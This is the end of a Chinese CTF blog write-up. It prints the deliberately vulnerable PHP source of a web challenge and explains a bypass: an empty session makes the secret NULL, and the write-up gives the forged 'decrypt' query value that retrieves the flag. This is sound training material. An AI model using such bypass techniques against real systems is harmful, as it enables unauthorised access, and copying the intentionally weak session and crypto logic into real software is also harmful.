+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line">$f1ag = <span class="string">'f1ag&#123;s1mpl3_SSRF_@nd_spr1ntf&#125;'</span>; <span class="comment">//fake</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">aesEn</span><span class="params">($data, $key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $method = <span class="string">'AES-128-CBC'</span>;</span><br><span class="line">    $iv = md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>],<span class="keyword">true</span>);</span><br><span class="line">    <span class="keyword">return</span>  base64_encode(openssl_encrypt($data, $method,$key, OPENSSL_RAW_DATA , $iv));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Check</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>($_COOKIE[<span class="string">'your_ip_address'</span>]) &amp;&amp; $_COOKIE[<span class="string">'your_ip_address'</span>] === md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]) &amp;&amp; $_COOKIE[<span class="string">'y1ng'</span>] === sha1(md5(<span class="string">'y1ng'</span>)))</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ( $_SERVER[<span class="string">'REMOTE_ADDR'</span>] == <span class="string">"127.0.0.1"</span> ) &#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;head&gt;&lt;title&gt;403 Forbidden&lt;/title&gt;&lt;/head&gt;&lt;body bgcolor=black&gt;&lt;center&gt;&lt;font size='10px' color=white&gt;&lt;br&gt;only 127.0.0.1 can access! You know what I mean right?&lt;br&gt;your ip address is "</span> . $_SERVER[<span class="string">'REMOTE_ADDR'</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$_SESSION[<span class="string">'user'</span>] = md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'decrypt'</span>])) &#123;</span><br><span class="line">    $decr = $_GET[<span class="string">'decrypt'</span>];</span><br><span class="line">    <span class="keyword">if</span> (Check())&#123;</span><br><span class="line">        $data = $_SESSION[<span class="string">'secret'</span>];</span><br><span class="line">        <span class="keyword">include</span> <span class="string">'flag_2sln2ndln2klnlksnf.php'</span>;</span><br><span class="line">        $cipher = aesEn($data, <span class="string">'y1ng'</span>);</span><br><span class="line">        <span class="keyword">if</span> ($decr === $cipher)&#123;</span><br><span class="line">            <span class="keyword">echo</span> WHAT_YOU_WANT;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">'爬'</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span>&#123;</span><br><span class="line">        header(<span class="string">"Refresh:0.1;url=index.php"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="comment">//I heard you can break PHP mt_rand seed</span></span><br><span class="line">    mt_srand(rand(<span class="number">0</span>,<span class="number">9999999</span>));</span><br><span class="line">    $length = mt_rand(<span class="number">40</span>,<span class="number">80</span>);</span><br><span class="line">    $_SESSION[<span class="string">'secret'</span>] = bin2hex(random_bytes($length));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>PS：上面那个f1ag是个假货，还得接着搞。<br>接着分析<br>REMOTE_ADDR是不可以伪造的，所以这部分跳过。<br>Check部分是对应的your_ip_address和y1ng。这两部分是对的数据。。不用改。<br>开始以为是mt_rand种子爆破，但是条件不够出不来。<br>关键点在<br>$data = $_SESSION[‘secret’];<br>$_SESSION是与存在客户端的PHPSESSID相关的。。如果读不到PHPSESSID。那么这一条就为NULL。<br>接下来只要通过aesEn(NULL, ‘y1ng’);算出一个空值就行了。<br>生成playload<br>?decrypt=Gh1BXo8eH92fqnm0EyfREw%3D%3D<br>最终拿下<br><img src="wjtc_2.png" alt=""></p>
+
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div>坚持原创技术分享，您的支持将鼓励我继续创作！</div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    打赏
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/file/weixin.png" alt="粗制乱造 微信支付">
+        <p>微信支付</p>
+      </div>
+      
+      <div style="display: inline-block;">
+        <img src="/file/zfb.png" alt="粗制乱造 支付宝">
+        <p>支付宝</p>
+      </div>
+
+  </div>
+</div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/CTF/" rel="tag"># CTF</a>
+              <a href="/tags/%E7%BB%83%E4%B9%A0%E9%A2%98/" rel="tag"># 练习题</a>
+              <a href="/tags/CTF%E8%AF%BE/" rel="tag"># CTF课</a>
+              <a href="/tags/WEB/" rel="tag"># WEB</a>
+              <a href="/tags/%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/" rel="tag"># 黑盒测试</a>
+              <a href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/" rel="tag"># 文件上传</a>
+              <a href="/tags/getshell/" rel="tag"># getshell</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/jxsw_dbw_web_8/" rel="prev" title="WEB复习（大比武_CTF课_第八天天）">
+      <i class="fa fa-chevron-left"></i> WEB复习（大比武_CTF课_第八天天）
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/jxsw_dbw_web_9/" rel="next" title="小测验（大比武_CTF课_第九天）">
+      小测验（大比武_CTF课_第九天） <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#笔记"><span class="nav-number">2.</span> <span class="nav-text">笔记</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#解题"><span class="nav-number">3.</span> <span class="nav-text">解题</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#GYCTF2020-EasyThinking"><span class="nav-number">3.1.</span> <span class="nav-text">[GYCTF2020]EasyThinking</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#分析"><span class="nav-number">3.1.1.</span> <span class="nav-text">分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#查找漏洞"><span class="nav-number">3.1.2.</span> <span class="nav-text">查找漏洞</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞利用"><span class="nav-number">3.1.3.</span> <span class="nav-text">漏洞利用</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#GKCTF2020-CheckIN"><span class="nav-number">3.2.</span> <span class="nav-text">[GKCTF2020]CheckIN</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#代码审计"><span class="nav-number">3.2.1.</span> <span class="nav-text">代码审计</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#开整"><span class="nav-number">3.2.2.</span> <span class="nav-text">开整</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#BJDCTF-2nd-文件探测"><span class="nav-number">3.3.</span> <span class="nav-text">[BJDCTF 2nd]文件探测</span></a></li></ol></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="粗制乱造"
+      src="/file/avatar.png">
+  <p class="site-author-name" itemprop="name">粗制乱造</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">24</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">25</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">33</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">粗制乱造</span>
+</div>
+  <div class="powered-by">由 <a href="https://czlz.net/" class="theme-link">czlz.net</a> 强力驱动
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
